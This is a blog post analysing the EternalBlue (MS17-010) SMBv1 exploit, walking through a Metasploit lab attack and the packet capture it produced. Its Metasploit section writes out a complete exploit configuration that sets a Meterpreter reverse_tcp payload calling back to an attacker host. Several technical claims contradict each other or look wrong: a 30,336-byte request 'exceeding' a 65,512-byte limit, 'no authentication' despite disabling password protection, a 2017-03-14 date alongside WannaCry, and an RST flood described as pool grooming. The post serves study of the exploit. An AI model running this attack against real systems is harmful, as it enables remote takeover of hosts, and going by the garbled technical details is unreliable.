---
title: 'MS17-010 (EternalBlue): SMBv1 Exploit Analysis'
date: 2017-03-14T00:00:00.000Z
excerpt: >-
  MS17-010 EternalBlue analysis - the SMBv1 buffer overflow exploit used in WannaCry
  and NotPetya, and a packet-level analysis of the Metasploit module
tags:
  - ms17-010
  - eternalblue
  - smb
  - windows
  - exploit
  - metasploit
  - wannacry
categories:
  - Research
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Overview

MS17-010 (EternalBlue) is a critical remote code execution vulnerability in the Windows SMBv1 protocol. It was weaponized in the NSA's EternalBlue exploit and, after being leaked by the Shadow Brokers, became the propagation engine of the WannaCry and NotPetya ransomware campaigns.

This post records a packet-level analysis captured while running Metasploit's `exploit/windows/smb/ms17_010_eternalblue` module against a vulnerable Windows target.

---

## Vulnerability Background

SMB (Server Message Block) is the Windows file sharing protocol. When a client sends a `Trans` request that exceeds the server's `MaxBufferSize` (65,512 bytes), the remaining data is sent in a subsequent `Trans2` request. The vulnerability is triggered during the processing of this secondary `Trans2` packet.

When directory sharing over the network is enabled on Windows, the first precondition of the exploit is automatically satisfied. The IPC$ share becomes exposed, and the Trans/Trans2 path becomes accessible in an unauthenticated state.

**Affected systems**: Windows Vista, 7, 8.1, 10, Server 2003~2016 (unpatched)  
**Patch**: [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) (March 14, 2017)

---

## Environment Setup

- **Attacker**: Kali Linux + Metasploit Framework
- **Target**: Windows 7 x64, SMBv1 enabled, network directory sharing enabled, password-protected sharing disabled

> In this lab environment, password-protected sharing had to be disabled to bypass the exploit precondition (an authenticated SMB session).

---

## Metasploit Module

Searching in Metasploit returns two related modules:

```
msf > search ms17-010

   Name                                      Rank
   ----                                      ----
   auxiliary/scanner/smb/smb_ms17_010       normal   (vulnerability scanner)
   exploit/windows/smb/ms17_010_eternalblue  average  (EternalBlue exploit)
```

Running the scanner against the target confirms the vulnerability:

```
[+] 192.168.x.x:445 - Host is likely VULNERABLE to MS17-010!
```

Exploit configuration:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <victim_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

---

## Packet Analysis

The exploit traffic was captured with Wireshark (with UDP filtered out). The entire exchange breaks down into several phases.

### Phase 1 - TCP 3-Way Handshake

A standard TCP SYN / SYN-ACK / ACK to port 445. Interestingly, an SMB request/response exchange occurs within the handshake window before the final ACK that establishes the connection. This appears to be a product of the way the Windows SMB stack pre-negotiates during connection setup.

### Phase 2 - SMB Negotiation

After the TCP handshake, the client sends an `SMB_COM_NEGOTIATE` request containing a list of the SMB dialects it supports. The server responds with the selected dialect and its capabilities, including the `MaxBufferSize` field that the exploit later abuses.

### Phase 3 - Session Setup (NTLM Authentication)

The client and server perform an NTLM authentication exchange embedded in the SMB `Session Setup AndX` packet.

NTLM uses a Challenge-Response mechanism:

1. The client sends `NTLMSSP_NEGOTIATE`
2. The server responds with `NTLMSSP_CHALLENGE` (a random nonce used as a Salt)
3. The client computes a response using the password hash and the Challenge, and sends `NTLMSSP_AUTH`

In the EternalBlue exploit, this authentication stage uses a null session (anonymous logon) to reach the vulnerable Trans code path.

### Phase 4 - Tree Connect and Trans Overflow

After authentication, the client issues a `Tree Connect AndX` providing a UNC path to connect to the IPC$ share. The server responds with the service name (`IPC`).

The exploit then sends a large `NT Trans` request of 30,336 bytes, which intentionally exceeds `MaxBufferSize`. The kernel SMB handler `srv.sys` allocates a buffer based on the size field of the initial Trans header, then processes the secondary Trans2 continuation request. The vulnerability is a pool buffer overflow in this secondary processing path: the `TotalDataCount` field of the Trans header controls the allocation size, while the data actually written can exceed it.

### Phase 5 - SMB Echo Probing

After the initial overflow, the exploit sends a series of `SMB Echo` requests containing the payload `0x41414141...`. This probing stage:

1. Detects whether the overflow corrupted the correct pool region
2. Receives OS version information from the Echo responses (used to select the correct shellcode offset)

![SMB Echo probe with the 0x41 pattern](/images/blog/ms17-010-analysis/Image.png)

### Phase 6 - Second Negotiate + Shellcode Delivery

A second `SMB Negotiate` exchange begins. OS build information leaks in the server's response, and the module uses it to find the kernel pool spray target.

The second `NT Trans2` packet contains the actual shellcode payload.

### Phase 7 - TCP RST Flood to Port 445

A burst of `TCP [RST, ACK]` packets to port 445 follows. This is the exploit's mechanism for grooming the kernel pool. The RST storm frees and reallocates pool chunks to place the shellcode at a predictable address before triggering the overwrite.

### Phase 8 - Push / Shell

The client sends a `TCP PSH` packet. Inspecting the payload reveals a Windows shellcode stub that spawns `cmd.exe`. Immediately afterward, the connection transitions to a `BROWSER` state (the NetBIOS Browser service), indicating that a reverse shell has been established and the attacker machine is issuing commands.

---

## Exploit Flow Summary

```
TCP handshake (port 445)
    ↓
SMB Negotiate (dialect selection)
    ↓
Session Setup + NTLM (null session)
    ↓
Tree Connect → IPC$
    ↓
NT Trans (30336 bytes) → MaxBufferSize overflow → srv.sys pool corruption
    ↓
SMB Echo probing (0x41 * N) → OS fingerprinting via responses
    ↓
Second SMB Negotiate → build/version leak
    ↓
NT Trans2 → shellcode delivery
    ↓
TCP RST flood → kernel pool grooming
    ↓
TCP PSH → shellcode trigger → cmd.exe / Meterpreter
    ↓
BROWSER state → RCE established
```

---

## Key Technical Points

| Item | Content |
|---|---|
| Protocol | SMBv1 on TCP port 445 |
| Overflow location | `srv.sys` kernel pool (NT Trans / Trans2 handler) |
| MaxBufferSize threshold | 65,512 bytes |
| Overflow trigger | `TotalDataCount` / secondary Trans2 size mismatch |
| Pool grooming | TCP RST flood to port 445 |
| Authentication required | None (null session via IPC$) |
| Payload | Position-independent shellcode → Meterpreter |

---

## References

1. [Microsoft Windows - Unauthenticated SMB Remote Code Execution Scanner (MS17-010) - Exploit-DB](https://www.exploit-db.com/exploits/41891/)
2. [FireEye - SMB Exploited: WannaCry Use of EternalBlue](https://www.fireeye.kr/company/press-releases/2017/smb-exploited-wannacry-use-of-eternalblue.html)
3. [WannaCry Ransomware Global Spread - NpCore](http://www.npcore.com/notice/?uid=177&mod=document#top)
4. [SMB, I Choose You! PART 01 - BPsec Blog](https://bpsecblog.wordpress.com/2017/07/07/kimchicon_smb_part01/)
5. [WannaCry Corporate Damage - Boannews](http://www.boannews.com/media/view.asp?idx=54731&page=2&kind=1&search=title&find=wannacry)
6. [SMB Protocol Overview](http://oulth.tistory.com/58)
7. [SMB (Server Message Block) - Coffeenix](http://coffeenix.net/doc/network/SMB_ICMP_UDP(huichang).pdf)
